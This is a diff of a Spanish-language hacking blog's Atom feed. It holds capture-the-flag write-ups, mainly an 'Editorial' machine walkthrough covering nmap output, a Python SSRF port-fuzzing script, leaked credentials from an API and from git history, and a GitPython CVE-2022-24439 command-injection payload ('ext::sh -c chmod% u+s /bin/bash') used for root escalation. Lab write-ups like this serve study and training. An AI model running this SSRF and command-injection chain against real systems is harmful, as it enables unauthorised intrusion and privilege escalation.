@@ -1,5 +1,461 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-21T14:38:13-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Esto es una página de prueba de hacking
-</subtitle><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><entry><title type="html">OSCP</title><link href="http://localhost:4000/certifications/oscp.html" rel="alternate" type="text/html" title="OSCP" /><published>2024-06-21T00:00:00-06:00</published><updated>2024-06-21T00:00:00-06:00</updated><id>http://localhost:4000/certifications/oscp</id><content type="html" xml:base="http://localhost:4000/certifications/oscp.html"><![CDATA[<p>El certificado que más me consto económica y mentalmente.</p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="certifications" /><summary type="html"><![CDATA[El certificado que más me consto económica y mentalmente.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/certifications/OSCP.png" /><media:content medium="image" url="http://localhost:4000/assets/img/certifications/OSCP.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Acute</title><link href="http://localhost:4000/machine.html" rel="alternate" type="text/html" title="Acute" /><published>2024-06-20T00:00:00-06:00</published><updated>2024-06-20T00:00:00-06:00</updated><id>http://localhost:4000/machine</id><content type="html" xml:base="http://localhost:4000/machine.html"><![CDATA[<p>Lo más relevante de esta máquina fue</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" xml:lang="en"><generator uri="https://jekyllrb.com/" version="3.9.5">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" hreflang="en" /><updated>2024-06-24T12:56:15-06:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Armando Villalobos</title><subtitle>Esto es una página de prueba de hacking
+</subtitle><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><entry><title type="html">Axlle</title><link href="http://localhost:4000/machines/axlle.html" rel="alternate" type="text/html" title="Axlle" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/machines/axlle</id><content type="html" xml:base="http://localhost:4000/machines/axlle.html"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>
+
+<pre><code class="language-cmd">sudo nmap -p25,53,80,88,135,139,389,445,464,593,636,3268,3269,3389,5985,9389,49664,49668,51585,61835,61836,61838,65168 -sCV 10.10.1
+1.21 -oN targeted
+Starting Nmap 7.93 ( https://nmap.org ) at 2024-06-23 21:22 CST
+Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
+Service scan Timing: About 73.91% done; ETC: 21:23 (0:00:16 remaining)
+Nmap scan report for 10.10.11.21
+Host is up (0.080s latency).
+
+PORT      STATE SERVICE       VERSION
+25/tcp    open  smtp          hMailServer smtpd
+| smtp-commands: MAINFRAME, SIZE 20480000, AUTH LOGIN, HELP
+|_ 211 DATA HELO EHLO MAIL NOOP QUIT RCPT RSET SAML TURN VRFY
+53/tcp    open  domain        Simple DNS Plus
+80/tcp    open  http          Microsoft IIS httpd 10.0
+|_http-server-header: Microsoft-IIS/10.0
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: Axlle Development
+88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-06-24 03:23:02Z)
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp   open  tcpwrapped
+3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: axlle.htb0., Site: Default-First-Site-Name)
+3269/tcp  open  tcpwrapped
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: commonName=MAINFRAME.axlle.htb
+| Not valid before: 2024-05-19T11:25:03
+|_Not valid after:  2024-11-18T11:25:03
+| rdp-ntlm-info: 
+|   Target_Name: AXLLE
+|   NetBIOS_Domain_Name: AXLLE
+|   NetBIOS_Computer_Name: MAINFRAME
+|   DNS_Domain_Name: axlle.htb
+|   DNS_Computer_Name: MAINFRAME.axlle.htb
+|   DNS_Tree_Name: axlle.htb
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-06-24T03:23:52+00:00
+|_ssl-date: 2024-06-24T03:24:31+00:00; +2s from scanner time.
+5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+9389/tcp  open  mc-nmf        .NET Message Framing
+49664/tcp open  msrpc         Microsoft Windows RPC
+49668/tcp open  msrpc         Microsoft Windows RPC
+51585/tcp open  msrpc         Microsoft Windows RPC
+61835/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+61836/tcp open  msrpc         Microsoft Windows RPC
+61838/tcp open  msrpc         Microsoft Windows RPC
+65168/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: MAINFRAME; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+|_clock-skew: mean: 2s, deviation: 0s, median: 2s
+| smb2-security-mode: 
+|   311: 
+|_    Message signing enabled and required
+| smb2-time: 
+|   date: 2024-06-24T03:23:53
+|_  start_date: N/A
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 99.26 seconds
+</code></pre>
+
+<p><img src="/assets/img/machines/axlle/axlle.jpg" alt="imagen1" /></p>]]></content><author><name>&lt;firstname&gt; &lt;lastname&gt;</name><email>&lt;mail@domain.tld&gt;</email></author><category term="machines" /><summary type="html"><![CDATA[Los primero pasos es escanear la máquina para saber que puertos están abiertos.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/machines/axlle/logo.png" /><media:content medium="image" url="http://localhost:4000/assets/img/machines/axlle/logo.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Editorial</title><link href="http://localhost:4000/machines/editorial.html" rel="alternate" type="text/html" title="Editorial" /><published>2024-06-23T00:00:00-06:00</published><updated>2024-06-23T00:00:00-06:00</updated><id>http://localhost:4000/machines/editorial</id><content type="html" xml:base="http://localhost:4000/machines/editorial.html"><![CDATA[<p>Los primero pasos es escanear la máquina para saber que puertos están abiertos.</p>
+
+<pre><code class="language-cmd"># Nmap 7.93 scan initiated Sun Jun 23 19:10:57 2024 as: nmap -p22,80 -sCV -oN targeted 10.10.11.20
+Nmap scan report for editorial.htb (10.10.11.20)
+Host is up (0.079s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 0dedb29ce253fbd4c8c1196e7580d864 (ECDSA)
+|_  256 0fb9a7510e00d57b5b7c5fbf2bed53a0 (ED25519)
+80/tcp open  http    nginx 1.18.0 (Ubuntu)
+|_http-server-header: nginx/1.18.0 (Ubuntu)
+|_http-title: Editorial Tiempo Arriba
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Sun Jun 23 19:11:07 2024 -- 1 IP address (1 host up) scanned in 9.78 seconds
+</code></pre>
+<p>Revisando el puerto 80 vemos que tenemos un sitio web donde podemos subir un archivo de texto. En este nos muestra dos opciones: <code class="language-plaintext highlighter-rouge">url</code> y <code class="language-plaintext highlighter-rouge">adjuntando</code>. Siempre que tenemos un campo donde podemos apuntar a alguna URL es recomendable probar un ataque de <code class="language-plaintext highlighter-rouge">SSRF</code>.</p>
+
+<p><img src="/assets/img/machines/editorial/editorial1.jpg" alt="imagen1" /></p>
+
+<p><img src="/assets/img/machines/editorial/editorial2.jpg" alt="imagen2" /></p>
+
+<p>Procedemos a interceptar la petición con <code class="language-plaintext highlighter-rouge">Burpsuite</code>, podemos ver que se manda una petición <code class="language-plaintext highlighter-rouge">POST</code>. Al intentar apuntar a la máquina local, vemos que no tienen ningun bloqueo. Intentar puerto por puerto manualmente nos llevará bastante tiempo, por lo que, creé un script en python para hacer este trabajo.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">import</span> <span class="nn">pwn</span>
+<span class="kn">import</span> <span class="nn">threading</span>
+<span class="kn">import</span> <span class="nn">queue</span>
+
+<span class="n">url</span> <span class="o">=</span> <span class="s">"http://editorial.htb/upload-cover"</span>
+<span class="n">proxy</span> <span class="o">=</span> <span class="p">{</span><span class="s">"http"</span><span class="p">:</span><span class="s">"127.0.0.1:8080"</span><span class="p">}</span>
+<span class="n">header</span> <span class="o">=</span> <span class="p">{</span><span class="s">"Content-Type"</span><span class="p">:</span><span class="s">"multipart/form-data; boundary=----WebKitFormBoundaryxCyQMtVBFzp73HTl"</span><span class="p">}</span>
+<span class="n">pwnlogs</span> <span class="o">=</span> <span class="n">pwn</span><span class="p">.</span><span class="n">log</span>
+
+<span class="k">def</span> <span class="nf">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
+    <span class="n">s</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">session</span><span class="p">()</span>
+    <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">,</span> <span class="n">proxies</span><span class="o">=</span><span class="n">proxy</span><span class="p">,</span> <span class="n">headers</span><span class="o">=</span><span class="n">header</span><span class="p">)</span>
+    <span class="n">clength</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">headers</span><span class="p">.</span><span class="n">get</span><span class="p">(</span><span class="s">"Content-Length"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">clength</span>
+
+<span class="k">def</span> <span class="nf">worker</span><span class="p">(</span><span class="n">port_queue</span><span class="p">):</span>
+    <span class="k">while</span> <span class="ow">not</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">empty</span><span class="p">():</span>
+        <span class="n">i</span> <span class="o">=</span> <span class="n">port_queue</span><span class="p">.</span><span class="n">get</span><span class="p">()</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="sa">f</span><span class="s">"""------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookurl"</span><span class="se">\n\n</span><span class="s">http://127.0.0.1:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="se">\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl</span><span class="se">\n</span><span class="s">Content-Disposition: form-data; name="bookfile"; filename=""</span><span class="se">\n</span><span class="s">Content-Type: application/octet-stream</span><span class="se">\n\n\n</span><span class="s">------WebKitFormBoundaryxCyQMtVBFzp73HTl--"""</span>
+
+        <span class="n">response_length</span> <span class="o">=</span> <span class="n">fuzzing</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">response_length</span> <span class="o">!=</span> <span class="s">"61"</span><span class="p">:</span>
+            <span class="k">print</span><span class="p">(</span><span class="sa">f</span><span class="s">"Puerto:</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s"> encontrado"</span><span class="p">)</span>
+
+        <span class="n">port_queue</span><span class="p">.</span><span class="n">task_done</span><span class="p">()</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">pwnlogs</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"Iniciando fuerza bruta"</span><span class="p">)</span>
+    <span class="n">progress</span> <span class="o">=</span> <span class="n">pwnlogs</span><span class="p">.</span><span class="n">progress</span><span class="p">(</span><span class="s">"Probando puertos"</span><span class="p">)</span>
+
+    <span class="n">port_queue</span> <span class="o">=</span> <span class="n">queue</span><span class="p">.</span><span class="n">Queue</span><span class="p">()</span>
+
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">65535</span><span class="p">):</span>
+        <span class="n">port_queue</span><span class="p">.</span><span class="n">put</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
+
+    <span class="n">num_threads</span> <span class="o">=</span> <span class="mi">30</span>
+    <span class="n">threads</span> <span class="o">=</span> <span class="p">[]</span>
+
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">num_threads</span><span class="p">):</span>
+        <span class="n">thread</span> <span class="o">=</span> <span class="n">threading</span><span class="p">.</span><span class="n">Thread</span><span class="p">(</span><span class="n">target</span><span class="o">=</span><span class="n">worker</span><span class="p">,</span> <span class="n">args</span><span class="o">=</span><span class="p">(</span><span class="n">port_queue</span><span class="p">,))</span>
+        <span class="n">thread</span><span class="p">.</span><span class="n">start</span><span class="p">()</span>
+        <span class="n">threads</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="n">thread</span><span class="p">)</span>
+
+    <span class="k">for</span> <span class="n">thread</span> <span class="ow">in</span> <span class="n">threads</span><span class="p">:</span>
+        <span class="n">thread</span><span class="p">.</span><span class="n">join</span><span class="p">()</span>
+
+<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">'__main__'</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Para este script utilizamos hilos para que haga más rápido el trabajo, el ejecutarlo nos encontramo con lo siguiente.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>python3 exploit.py
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Iniciando fuerza bruta
+<span class="o">[</span>&lt;<span class="o">]</span> Probando puertos
+Puerto:5000 encontrado
+</code></pre></div></div>
+<p>Vemos que pasa cuando ponemos este puerto en la petición de burpsuite.Nos arroja una liga donde podemos descargar un archivo. Para esto lo intenté unas cuántas veces porque me daba errores la liga.</p>
+
+<p><img src="/assets/img/machines/editorial/editorial3.jpg" alt="imagen3" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>wget http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
+<span class="nt">--2024-06-23</span> 19:29:56--  http://editorial.htb/static/uploads/33bf0431-5b5e-4d19-896a-1f18aa797401
+Resolving editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>... 10.10.11.20
+Connecting to editorial.htb <span class="o">(</span>editorial.htb<span class="o">)</span>|10.10.11.20|:80... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 911 <span class="o">[</span>application/octet-stream]
+Saving to: ‘33bf0431-5b5e-4d19-896a-1f18aa797401’
+
+33bf0431-5b5e-4d19-896a-1f18aa797401       100%[<span class="o">======================================================================================&gt;]</span>     911  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s      
+
+2024-06-23 19:29:56 <span class="o">(</span>122 MB/s<span class="o">)</span> - ‘33bf0431-5b5e-4d19-896a-1f18aa797401’ saved <span class="o">[</span>911/911]
+</code></pre></div></div>
+<p>Nos encontramos con un archivo que contiene datos de alguna api</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span><span class="nb">cat </span>33bf0431-5b5e-4d19-896a-1f18aa797401 | jq
+<span class="o">{</span>
+  <span class="s2">"messages"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"promotions"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the promotions in our library."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/promos"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"coupons"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve the list of coupons to use in our library."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/coupons"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"new_authors"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve the welcome message sended to our new authors."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/authors"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"platform_use"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve examples of how to use the platform."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/messages/how_to_use_platform"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">]</span>,
+  <span class="s2">"version"</span>: <span class="o">[</span>
+    <span class="o">{</span>
+      <span class="s2">"changelog"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve a list of all the versions and updates of the api."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata/changelog"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>,
+    <span class="o">{</span>
+      <span class="s2">"latest"</span>: <span class="o">{</span>
+        <span class="s2">"description"</span>: <span class="s2">"Retrieve the last version of api."</span>,
+        <span class="s2">"endpoint"</span>: <span class="s2">"/api/latest/metadata"</span>,
+        <span class="s2">"methods"</span>: <span class="s2">"GET"</span>
+      <span class="o">}</span>
+    <span class="o">}</span>
+  <span class="o">]</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Realizamos el mismo procedimiento para ver estos endpoints</p>
+
+<p><img src="/assets/img/machines/editorial/editorial4.jpg" alt="imagen4" /></p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>guero@guero<span class="nv">$ </span>curl <span class="nt">-s</span> http://editorial.htb/static/uploads/86f4bfec-ccce-4ab3-b012-0901752e0318  | jq
+<span class="o">{</span>
+  <span class="s2">"template_mail_message"</span>: <span class="s2">"Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.</span><span class="se">\n\n</span><span class="s2">Your login credentials for our internal forum and authors site are:</span><span class="se">\n</span><span class="s2">Username: dev</span><span class="se">\n</span><span class="s2">Password: dev080217_devAPI!@</span><span class="se">\n</span><span class="s2">Please be sure to change your password as soon as possible for security purposes.</span><span class="se">\n\n</span><span class="s2">Don't hesitate to reach out if you have any questions or ideas - we're always here to support you.</span><span class="se">\n\n</span><span class="s2">Best regards, Editorial Tiempo Arriba Team."</span>
+<span class="o">}</span>
+</code></pre></div></div>
+<p>Nos encontramos con un usuario y contraseña, al probarlo con ssh podemos entrar al sistema.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ssh dev@editorial.htb 
+The authenticity of host <span class="s1">'editorial.htb (10.10.11.20)'</span> can<span class="s1">'t be established.
+ED25519 key fingerprint is SHA256:YR+ibhVYSWNLe4xyiPA0g45F4p1pNAcQ7+xupfIR70Q.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '</span>editorial.htb<span class="s1">' (ED25519) to the list of known hosts.
+dev@editorial.htb'</span>s password: 
+Welcome to Ubuntu 22.04.4 LTS <span class="o">(</span>GNU/Linux 5.15.0-112-generic x86_64<span class="o">)</span>
+
+ <span class="k">*</span> Documentation:  https://help.ubuntu.com
+ <span class="k">*</span> Management:     https://landscape.canonical.com
+ <span class="k">*</span> Support:        https://ubuntu.com/pro
+
+ System information as of Mon Jun 24 01:43:24 AM UTC 2024
+
+  System load:           0.0
+  Usage of /:            61.5% of 6.35GB
+  Memory usage:          13%
+  Swap usage:            0%
+  Processes:             224
+  Users logged <span class="k">in</span>:       0
+  IPv4 address <span class="k">for </span>eth0: 10.10.11.20
+  IPv6 address <span class="k">for </span>eth0: dead:beef::250:56ff:feb0:e7c3
+
+</code></pre></div></div>
+<p>Dentro encontramos la carpeta app y dentro encontramos un archivo .git, al tener el programa instalado en la máquina podemos ver los logs históricos, en uno de ellos podemos ver la contraseña del usuario prod.</p>
+
+<pre><code class="language-git">-bash-5.1$ ls -la
+total 12
+drwxrwxr-x 3 dev dev 4096 Jun  5 14:36 .
+drwxr-x--- 4 dev dev 4096 Jun  5 14:36 ..
+drwxr-xr-x 8 dev dev 4096 Jun 24 01:45 .git
+-bash-5.1$ git log
+commit 8ad0f3187e2bda88bba85074635ea942974587e8 (HEAD -&gt; master)
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:04:21 2023 -0500
+
+    fix: bugfix in api port endpoint
+
+commit dfef9f20e57d730b7d71967582035925d57ad883
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 21:01:11 2023 -0500
+
+    change: remove debug and update api port
+
+&lt;SNIP&gt;
+
+commit 1e84a036b2f33c59e2390730699a488c65643d28
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:51:10 2023 -0500
+
+    feat: create api to editorial info
+    
+    * It (will) contains internal info about the editorial, this enable
+       faster access to information.
+
+commit 3251ec9e8ffdd9b938e83e3b9fbf5fd1efa9bbb8
+Author: dev-carlos.valderrama &lt;dev-carlos.valderrama@tiempoarriba.htb&gt;
+Date:   Sun Apr 30 20:48:43 2023 -0500
+
+    feat: create editorial app
+
+-bash-5.1$ git diff 1e84a036b2f33c59e2390730699a488c65643d28
+diff --git a/app_api/app.py b/app_api/app.py
+deleted file mode 100644
+index 61b786f..0000000
+--- a/app_api/app.py
++++ /dev/null
+@@ -1,74 +0,0 @@
+--- a/app_api/app.py
++++ /dev/null
+@@ -1,74 +0,0 @@
+-# API (in development).
+-# * To retrieve info about editorial
+-
+-import json
+-from flask import Flask, jsonify
+-
+-# -------------------------------
+-# App configuration
+-# -------------------------------
+-app = Flask(__name__)
+-
+-# -------------------------------
+-# Global Variables
+-# -------------------------------
+-api_route = "/api/latest/metadata"
+-api_editorial_name = "Editorial Tiempo Arriba"
+-api_editorial_email = "info@tiempoarriba.htb"
+-
+-# -------------------------------
+-# API routes
+-# -------------------------------
+-# -- : home
+-@app.route('/api', methods=['GET'])
+-def index():
+-    data_editorial = {
+-        'version': [{
+-            '1': {
+-                'editorial': 'Editorial El Tiempo Por Arriba', 
+-                'contact_email_1': 'soporte@tiempoarriba.oc',
+-                'contact_email_2': 'info@tiempoarriba.oc',
+-                'api_route': '/api/v1/metadata/'
+-            }},
+-            {
+-            '1.1': {
+-                'editorial': 'Ed Tiempo Arriba', 
+-                'contact_email_1': 'soporte@tiempoarriba.oc',
+-                'contact_email_2': 'info@tiempoarriba.oc',
+-                'api_route': '/api/v1.1/metadata/'
+-            }},
+-            {
+-            '1.2': {
+-                'editorial': api_editorial_name, 
+-                'contact_email_1': 'soporte@tiempoarriba.oc',
+-                'contact_email_2': 'info@tiempoarriba.oc',
+-                'api_route': f'/api/v1.2/metadata/'
+-            }},
+-            {
+-            '2': {
+-                'editorial': api_editorial_name, 
+-                'contact_email': 'info@tiempoarriba.moc.oc',
+-                'api_route': f'/api/v2/metadata/'
+-            }},
+-            {
+-            '2.3': {
+-                'editorial': api_editorial_name, 
+-                'contact_email': api_editorial_email,
+-                'api_route': f'{api_route}/'
+-            }
+-        }]
+-    }
+-    return jsonify(data_editorial)
+-
+-# -- : (development) mail message to new authors
+-            }},
+-            {
+-            '2': {
+-                'editorial': api_editorial_name, 
+-                'contact_email': 'info@tiempoarriba.moc.oc',
+-                'api_route': f'/api/v2/metadata/'
+-            }},
+-            {
+-            '2.3': {
+-                'editorial': api_editorial_name, 
+-                'contact_email': api_editorial_email,
+-                'api_route': f'{api_route}/'
+-            }
+-        }]
+-    }
+-    return jsonify(data_editorial)
+-
+-# -- : (development) mail message to new authors
+-@app.route(api_route + '/authors/message', methods=['GET'])
+-def api_mail_new_authors():
+-    return jsonify({
+-        'template_mail_message': "Welcome to the team! We are thrilled to have you on board and can't wait to see the incredible content you'll bring to the table.\n\nYour login credentials for our internal forum and authors site are:\nUsername: prod\nPassword: 080217_Producti0n_2023!@\nPlease be sure to change your password as soon as possible for security purposes.\n\nDon't hesitate to reach out if you have any questions or ideas - we're always here to support you.\n\nBest regards, " + api_editorial_name + " Team."
+-    }) # TODO: replace dev credentials when checks pass
+-
+-# -------------------------------
+-# Start program
+-# -------------------------------
+-if __name__ == '__main__':
+-    app.run(host='127.0.0.1', port=5001, debug=True)
+</code></pre>
+<p>Con estas contraseñas podemos cambiar al usuario <code class="language-plaintext highlighter-rouge">prod</code> y viendo sus permisos sudo vemos lo siguiente:</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">-bash-5</span>.1<span class="nv">$ </span>su prod
+Password: 
+bash-5.1<span class="nv">$ </span><span class="nb">whoami
+</span>prod
+bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
+<span class="o">[</span><span class="nb">sudo</span><span class="o">]</span> password <span class="k">for </span>prod: 
+Matching Defaults entries <span class="k">for </span>prod on editorial:
+    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin, use_pty
+
+User prod may run the following commands on editorial:
+    <span class="o">(</span>root<span class="o">)</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="k">*</span>
+</code></pre></div></div>
+<p>Este script contiene lo siguiente:</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/python3
+</span>
+<span class="kn">import</span> <span class="nn">os</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+<span class="kn">from</span> <span class="nn">git</span> <span class="kn">import</span> <span class="n">Repo</span>
+
+<span class="n">os</span><span class="p">.</span><span class="n">chdir</span><span class="p">(</span><span class="s">'/opt/internal_apps/clone_changes'</span><span class="p">)</span>
+
+<span class="n">url_to_clone</span> <span class="o">=</span> <span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+
+<span class="n">r</span> <span class="o">=</span> <span class="n">Repo</span><span class="p">.</span><span class="n">init</span><span class="p">(</span><span class="s">''</span><span class="p">,</span> <span class="n">bare</span><span class="o">=</span><span class="bp">True</span><span class="p">)</span>
+<span class="n">r</span><span class="p">.</span><span class="n">clone_from</span><span class="p">(</span><span class="n">url_to_clone</span><span class="p">,</span> <span class="s">'new_changes'</span><span class="p">,</span> <span class="n">multi_options</span><span class="o">=</span><span class="p">[</span><span class="s">"-c protocol.ext.allow=always"</span><span class="p">])</span>
+</code></pre></div></div>
+<p>Investigando un poco nos encontramos con la vulnerabilidad <a href="https://security.snyk.io/vuln/SNYK-PYTHON-GITPYTHON-3113858">CVE-2022-24439</a>, realizamos lo siguiente para obtener una bash con privilegios.</p>
+
+<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>bash-5.1<span class="nv">$ </span><span class="nb">sudo</span> /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py <span class="s1">'ext::sh -c chmod% u+s /bin/bash'</span>
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+  File <span class="s2">"/opt/internal_apps/clone_changes/clone_prod_change.py"</span>, line 12, <span class="k">in</span> &lt;module&gt;
+    r.clone_from<span class="o">(</span>url_to_clone, <span class="s1">'new_changes'</span>, <span class="nv">multi_options</span><span class="o">=[</span><span class="s2">"-c protocol.ext.allow=always"</span><span class="o">])</span>
+  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1275, <span class="k">in </span>clone_from
+    <span class="k">return </span>cls._clone<span class="o">(</span>git, url, to_path, GitCmdObjectDB, progress, multi_options, <span class="k">**</span>kwargs<span class="o">)</span>
+  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/repo/base.py"</span>, line 1194, <span class="k">in </span>_clone
+    finalize_process<span class="o">(</span>proc, <span class="nv">stderr</span><span class="o">=</span>stderr<span class="o">)</span>
+  File <span class="s2">"/usr/local/lib/python3.10/dist-packages/git/util.py"</span>, line 419, <span class="k">in </span>finalize_process
